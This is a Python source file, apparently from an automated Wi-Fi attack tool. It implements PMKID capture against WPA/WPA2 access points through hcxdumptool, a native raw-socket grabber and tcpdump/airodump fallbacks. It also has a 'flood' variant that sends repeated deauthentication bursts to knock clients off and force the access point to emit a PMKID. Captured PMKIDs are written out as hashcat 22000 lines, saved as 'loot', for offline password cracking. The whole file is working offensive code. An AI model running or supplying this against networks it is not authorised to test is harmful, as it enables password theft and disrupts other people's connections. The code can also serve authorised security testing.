# SPDX-License-Identifier: Apache-2.0 OR BSD-3-Clause
"""Client-less PMKID capture (hcxdumptool, with a tcpdump fallback)."""

from __future__ import annotations

import contextlib
import os
import time
from pathlib import Path
from typing import List

from ..deps import registry
from ..pcap import analyze_file
from ..models import (STATUS_SKIPPED, STATUS_SUCCESS, AccessPoint,
                      Attempt, Capture)
from ..util import Process, human_duration, run
from .base import Attack, AttackContext, AttackOutcome


class PmkidAttack(Attack):
    name = "pmkid"
    label = "PMKID capture (client-less)"
    tool = "hcxdumptool / tcpdump"
    description = ("Request the RSN PMKID from the AP's first EAPOL message. "
                   "Works without any connected client and without deauthenticating "
                   "anyone, so it is the least disruptive WPA2 attack available.")
    # deauth is not needed; injection yes
    requires = ()

    def applies(self, ap: AccessPoint) -> bool:
        return ap.encryption in ("WPA", "WPA2", "WPA2/WPA3")

    def available(self, ctx: AttackContext) -> bool:
        # Native PmkidGrabber needs only a monitor interface
        return bool(ctx.demo or ctx.monitor
                    or registry.has("hcxdumptool") or registry.has("tcpdump")
                    or registry.has("airodump-ng"))

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return "needs a monitor interface (native PMKID grabber) or hcxdumptool/tcpdump"

    # ---------------------------------------------------------------- #
    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool, chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        if ap.has_pmkid:
            return AttackOutcome.skipped("PMKID already captured")
        if ctx.demo:
            return self._run_demo(ctx, ap, attempt)
        if registry.has("hcxdumptool"):
            outcome = self._run_hcx(ctx, ap, attempt)
            if outcome.status == STATUS_SUCCESS:
                return outcome
            # fall through to the sniffing fallback on failure
            ctx.bus.log("hcxdumptool produced no PMKID, falling back to native grabber",
                        level="debug")
        # Native AF_PACKET fallback — pure-Python PmkidGrabber
        if not ctx.demo and ctx.monitor:
            try:
                outcome = self._run_native(ctx, ap, attempt)
                if outcome.status == STATUS_SUCCESS:
                    return outcome
                ctx.bus.log("native PmkidGrabber produced no PMKID, falling back to passive sniff",
                            level="debug")
            except Exception as e:  # pragma: no cover
                ctx.bus.log(f"native PmkidGrabber error: {e}", level="debug")
        return self._run_sniff(ctx, ap, attempt)

    # ---------------------------------------------------------------- #
    def _run_demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        timeout = min(ctx.config.attack_timeout_for(self.name), 40)
        deadline = time.time() + timeout
        step = 0
        while time.time() < deadline and not ctx.want_stop():
            step += 1
            ctx.progress(f"requesting PMKID from {ap.display_name}", kind="capture",
                         bssid=ap.bssid, percent=min(95, step * 16),
                         detail="association request + EAPOL M1 (simulated)")
            time.sleep(0.6)
            if ctx.radio.pmkid_ok(ap.bssid):
                from ..synth import build_capture
                path = ctx.artifact_path("pmkid", ap, ".pcap")
                station = next((c.mac for c in ap.clients.values()), "02:00:00:00:00:01")
                demo_ap = ctx.radio.find(ap.bssid)
                _, pmkid = build_capture(
                    path, ap.essid or "demo", ap.bssid, station,
                    (demo_ap.psk if demo_ap else "") or "wifipilot-demo",
                    seed=abs(hash(ap.bssid)) % 100000,
                    include_pmkid=True, include_handshake=False)
                saved = ctx.session.save_artifact(path, "pmkid", ctx.loot_name(ap, "pmkid"))
                capture = Capture(kind="pmkid", bssid=ap.bssid, essid=ap.essid, path=saved,
                                  valid=True, tool="demo-radio", eapol=1,
                                  hash_path=saved,
                                  extra={"pmkid": pmkid, "simulated": True})
                ctx.session.add_capture(capture)
                ctx.session.end_attempt(attempt, STATUS_SUCCESS, "PMKID captured",
                                        "client-less PMKID (simulated)", capture)
                ctx.bus.log(f"PMKID captured for {ap.display_name} (simulated)", level="success")
                return AttackOutcome.success("PMKID captured", capture,
                                             "client-less PMKID (simulated)")
        return self._fail(ctx, attempt, "no PMKID in the association responses",
                          f"{int(timeout)}s budget exhausted")

    # ---------------------------------------------------------------- #
    def _hcx_args(self, monitor: str, out_path: str, ap: AccessPoint) -> List[str]:
        """Build hcxdumptool arguments for both the v5 and v6 CLI dialects."""
        binary = registry.path("hcxdumptool") or "hcxdumptool"
        help_text = run([binary, "--help"], timeout=10).text
        modern = "--enable_status" in help_text or "-w, --write" in help_text
        if modern:
            args = [binary, "-i", monitor, "-w", out_path, "--enable_status=1",
                    "--disable_deauthentication" if hasattr(self, "_no_deauth") else "--attempt_client_ap"]
            args = [a for a in args if a != "--attempt_client_ap"]
            args += ["--filtermode=2", f"--filterlist_ap={ap.bssid}"]
        else:
            args = [binary, "-i", monitor, "-o", out_path, "-c", ap.bssid, "--enable_status=1"]
        return args

    def _run_hcx(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        timeout = ctx.config.attack_timeout_for(self.name)
        out_path = ctx.artifact_path("pmkid", ap, ".pcapng")
        ctx.set_channel(ap.channel)
        args = self._hcx_args(ctx.monitor, out_path, ap)
        proc = Process(args, name="hcxdumptool", echo_lines=ctx.config.verbose_tools)
        proc.start()
        if proc.error:
            return self._fail(ctx, attempt, "hcxdumptool failed to start", proc.error)
        ctx.bus.log(f"PMKID hunt on {ap.display_name} (ch {ap.channel}) — "
                    f"up to {human_duration(timeout)}", level="info")
        found = ""
        started = time.time()
        try:
            while not ctx.want_stop() and time.time() - started < timeout:
                time.sleep(0.5)
                if os.path.exists(out_path) and os.path.getsize(out_path) > 0:
                    analysis = analyze_file(out_path, max_packets=80000)
                    if analysis.pmkids:
                        found = analysis.pmkids[0].pmkid
                        break
                ctx.progress(f"PMKID hunt on {ap.display_name}", kind="capture",
                             bssid=ap.bssid,
                             percent=min(95, (time.time() - started) / max(1, timeout) * 100),
                             detail=f"{len(ap.clients)} clients, hcxdumptool running")
        finally:
            with contextlib.suppress(Exception):
                proc.stop()

        if found:
            return self._finish_pmkid(ctx, ap, attempt, out_path, found, "hcxdumptool")
        if os.path.exists(out_path) and os.path.getsize(out_path) == 0:
            with contextlib.suppress(OSError):
                os.unlink(out_path)
        return self._fail(ctx, attempt, "no PMKID returned by hcxdumptool",
                          "AP may not expose a PMKID for association requests")

    # ---------------------------------------------------------------- #
    def _run_native(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        """Pure-Python AF_PACKET PMKID grabber fallback (no hcxtools required)."""
        import threading
        from ..native.pmkid import PmkidGrabber, pmkid_to_hashcat22000
        from ..native import radiotap
        from ..synth import write_pcap
        def _fmt(b: bytes) -> str:
            return ":".join(f"{x:02x}" for x in b)

        timeout = min(ctx.config.attack_timeout_for(self.name), 45)
        cap_path = ctx.artifact_path("pmkid", ap, ".pcap")
        ctx.set_channel(ap.channel)
        ctx.bus.log(f"PMKID hunt (native AF_PACKET) on {ap.display_name} (ch {ap.channel}) — "
                    f"up to {human_duration(timeout)}", level="info")
        try:
            grabber = PmkidGrabber(ctx.monitor, ap.bssid, ssid=ap.essid or "",
                                   channel=ap.channel, timeout=timeout)
        except OSError as e:
            return self._fail(ctx, attempt, "native PmkidGrabber failed to open socket", str(e))

        # Run grabber in a thread so we can report progress and respect stop.
        result_box = {"result": None}

        def _run_grabber():
            try:
                result_box["result"] = grabber.run()
            except Exception as e:  # pragma: no cover
                result_box["error"] = str(e)

        th = threading.Thread(target=_run_grabber, daemon=True)
        th.start()
        started = time.time()
        while th.is_alive() and not ctx.want_stop() and time.time() - started < timeout:
            ctx.progress(f"PMKID hunt on {ap.display_name}", kind="capture",
                         bssid=ap.bssid,
                         percent=min(95, (time.time() - started) / max(1, timeout) * 100),
                         detail=f"{len(ap.clients)} clients, native AF_PACKET grabber")
            th.join(timeout=0.5)
        if th.is_alive():
            grabber._stop.set()  # ask it to quit
            th.join(timeout=2.0)
        result = result_box.get("result")
        if not result or not result.pmkid:
            return self._fail(ctx, attempt, "no PMKID returned by native grabber",
                              "AP may not expose a PMKID for association requests")
        sta_mac = _fmt(result.sta_mac)
        # Save the captured M1 frame as the artifact pcap
        frames = []
        if result.m1_frame:
            frames.append(radiotap.with_header(result.m1_frame))
        if not frames:
            # Synthesise a placeholder frame so the pcap is non-empty
            frames.append(radiotap.with_header(result.m2_frame or b"\x00" * 40))
        write_pcap(cap_path, frames)
        # Write hashcat 22000 (WPA*01) line
        hashcat_line = pmkid_to_hashcat22000(result.ap_mac, result.sta_mac, result.pmkid,
                                             ap.essid or "", anonce=result.anonce)
        hash_path = ctx.artifact_path("pmkid", ap, ".22000")
        Path(hash_path).write_text(hashcat_line + "\n", encoding="utf-8")
        saved = ctx.session.save_artifact(cap_path, "pmkid", ctx.loot_name(ap, "pmkid"))
        hsaved = ctx.session.save_artifact(hash_path, "hashcat22000", ctx.loot_name(ap, "pmkid.22000"))
        capture = Capture(kind="pmkid", bssid=ap.bssid, essid=ap.essid, path=saved,
                          valid=True, tool="native (AF_PACKET)", eapol=1,
                          hash_path=hsaved,
                          extra={"pmkid": result.pmkid.hex(),
                                 "mac_ap": ap.bssid, "mac_sta": sta_mac})
        ctx.session.add_capture(capture)
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, "PMKID captured",
                                "client-less PMKID via native AF_PACKET grabber", capture)
        ctx.bus.log(f"PMKID captured for {ap.display_name} (native)", level="success")
        return AttackOutcome.success("PMKID captured", capture,
                                     "client-less PMKID via native AF_PACKET grabber")

    # ---------------------------------------------------------------- #
    def _run_sniff(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        """Passive fallback: capture beacon/EAPOL frames and grep for the PMKID KDE."""
        timeout = ctx.config.attack_timeout_for(self.name)
        dump = ctx.artifact_path("pmkid", ap, ".pcap")
        tool = registry.path("tcpdump") or registry.path("airodump-ng") or ""
        if not tool:
            return self._fail(ctx, attempt, "no capture tool available",
                              "install hcxtools or tcpdump")
        ctx.set_channel(ap.channel)
        if tool.endswith("airodump-ng"):
            args = [tool, ctx.monitor, "--bssid", ap.bssid, "-w", dump[:-4],
                    "--output-format", "pcap", "--write-interval", "1"]
            cap_path = dump
        else:
            args = [tool, "-i", ctx.monitor, "-w", dump, "-s", "0", "-U",
                    "-y", "IEEE802_11_RADIO", "-G", str(int(timeout))]
            cap_path = dump
        ctx.bus.log(f"passive PMKID sniff on {ap.display_name} for "
                    f"{human_duration(timeout)}", level="info")
        proc = Process(args, name=Path(tool).name, echo_lines=ctx.config.verbose_tools)
        proc.start()
        if proc.error:
            return self._fail(ctx, attempt, "capture tool failed", proc.error)
        started = time.time()
        found = ""
        last_size = -1
        last_progress = 0.0
        try:
            while not ctx.want_stop() and time.time() - started < timeout:
                candidate = cap_path if os.path.exists(cap_path) else ""
                if not candidate:
                    for name in os.listdir(os.path.dirname(dump) or "."):
                        if name.startswith(os.path.basename(dump)[:-4]) and name.endswith(".cap"):
                            candidate = os.path.join(os.path.dirname(dump), name)
                            break
                # check first, sleep after (the old loop slept a full
                # second before even its first look), and re-analyse only
                # when the capture grew
                if candidate:
                    with contextlib.suppress(OSError):
                        size = os.path.getsize(candidate)
                        if size > 0 and size != last_size:
                            last_size = size
                            analysis = analyze_file(candidate, max_packets=80000)
                            if analysis.pmkids:
                                found = analysis.pmkids[0].pmkid
                                cap_path = candidate
                                break
                if time.time() - last_progress >= 1.0:
                    last_progress = time.time()
                    ctx.progress(f"sniffing for PMKID · {ap.display_name}", kind="capture",
                                 bssid=ap.bssid,
                                 percent=min(95, (time.time() - started) / max(1, timeout) * 100),
                                 detail="waiting for an association/EAPOL with PMKID KDE")
                time.sleep(0.25)
        finally:
            with contextlib.suppress(Exception):
                proc.stop()
        if found:
            return self._finish_pmkid(ctx, ap, attempt, cap_path, found, Path(tool).name)
        return self._fail(ctx, attempt, "no PMKID seen",
                          "AP does not send a PMKID (common on 802.11r/PMF networks)")

    # ---------------------------------------------------------------- #
    def _finish_pmkid(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                      path: str, pmkid: str, tool: str) -> AttackOutcome:
        hash_path = path
        hcxpcapngtool = registry.path("hcxpcapngtool")
        if hcxpcapngtool:
            converted = ctx.artifact_path("pmkid", ap, ".hc22000")
            run([hcxpcapngtool, "-o", converted, path], timeout=120)
            if os.path.exists(converted) and os.path.getsize(converted) > 0:
                hash_path = converted
        ctx.bus.log(f"PMKID {pmkid[:16]}… captured from {ap.display_name}", level="success")
        return self._succeed(ctx, ap, attempt, "pmkid", path, tool, "PMKID captured",
                             f"PMKID {pmkid}", eapol=1,
                             extra={"pmkid": pmkid, "hash": hash_path})


# --------------------------------------------------------------------------- #
# the loud version
# --------------------------------------------------------------------------- #


class PmkidFloodAttack(PmkidAttack):
    """PMKID hunting on demand: deauthenticate so the AP emits M1 *now*.

    ``pmkid`` waits for a client to (re)connect and sends nothing; this one makes it
    happen, over and over, until a PMKID with a usable KDE turns up.  It is the
    attack for an AP whose clients are quiet, and it is loud — a deauth burst every
    few seconds for as long as it runs.  The deauthentication is bounded by the same
    ``deauth_count``/``deauth_interval`` settings the handshake attack uses, and it
    stops the moment a PMKID is in hand.
    """

    name = "pmkid_flood"
    label = "PMKID hunt (deauth + harvest)"
    tool = "aireplay-ng + airodump-ng --pmkid"
    description = ("Force a PMKID out of a quiet AP: broadcast deauth bursts make the "
                   "clients reconnect, the AP answers with M1 carrying a PMKID, and the "
                   "capture is converted to hashcat mode 22000.  Louder and faster than "
                   "the client-less PMKID attack.")
    # it deauthenticates clients on purpose: the authorisation gate must apply
    needs_injection = True

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool,
            chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        if ap.has_pmkid:
            ctx.session.end_attempt(attempt, STATUS_SKIPPED, "PMKID already captured",
                                    "the passive PMKID attack already won this target")
            return AttackOutcome.skipped("PMKID already captured")
        if not ap.clients:
            ctx.bus.log("no known clients: still deauthenticating broadcast, the AP "
                        "may answer with its own M1", level="warning")
        if ctx.demo:
            return self._run_demo(ctx, ap, attempt)
        return self._run_flood(ctx, ap, attempt)

    # ---------------------------------------------------------------- #
    def _run_flood(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt
                   ) -> AttackOutcome:
        airodump = registry.path("airodump-ng")
        if not airodump:
            return self._fail(ctx, attempt, "airodump-ng missing", "install aircrack-ng")
        timeout = ctx.config.attack_timeout_for("pmkid")
        prefix = ctx.artifact_path("pmkid", ap, "-active")
        cap_path = prefix + "-01.cap"
        channel = ap.channel or 0
        ctx.set_channel(channel)
        args = [airodump, ctx.monitor]
        if channel:
            args += ["-c", str(channel)]
        args += ["--bssid", ap.bssid, "--pmkid", "-w", prefix,
                 "--output-format", "pcap", "--write-interval", "1",
                 "--ignore-negative-one"]
        proc = Process(args, name="airodump-ng", echo_lines=ctx.config.verbose_tools)
        proc.start()
        if proc.error:
            return self._fail(ctx, attempt, "could not start airodump-ng", proc.error)
        started = time.time()
        last_burst = 0.0
        deauths = 0
        found = ""
        try:
            while not ctx.want_stop() and time.time() - started < timeout:
                time.sleep(0.75)
                ctx.progress(f"PMKID hunt on {ap.display_name}", kind="capture",
                             bssid=ap.bssid,
                             percent=min(95, (time.time() - started) / timeout * 100),
                             detail=f"{deauths} deauth frame(s) sent, waiting for M1")
                if os.path.exists(cap_path) and os.path.getsize(cap_path):
                    analysis = analyze_file(cap_path, max_packets=80000)
                    if analysis.pmkids:
                        found = analysis.pmkids[0].pmkid
                        break
                if time.time() - last_burst >= ctx.config.deauth_interval:
                    last_burst = time.time()
                    deauths += ctx.deauth(ap, broadcast=not ap.clients)
        finally:
            with contextlib.suppress(Exception):
                proc.stop()
        if found:
            return self._finish_pmkid(ctx, ap, attempt, cap_path, found,
                                      "aireplay-ng + airodump-ng")
        return self._fail(
            ctx, attempt, "no PMKID returned after deauth",
            f"{deauths} deauth frame(s) in {human_duration(time.time() - started)}: the "
            f"AP did not send a PMKID KDE (some vendors disable it — the handshake "
            f"attack is then the path)")
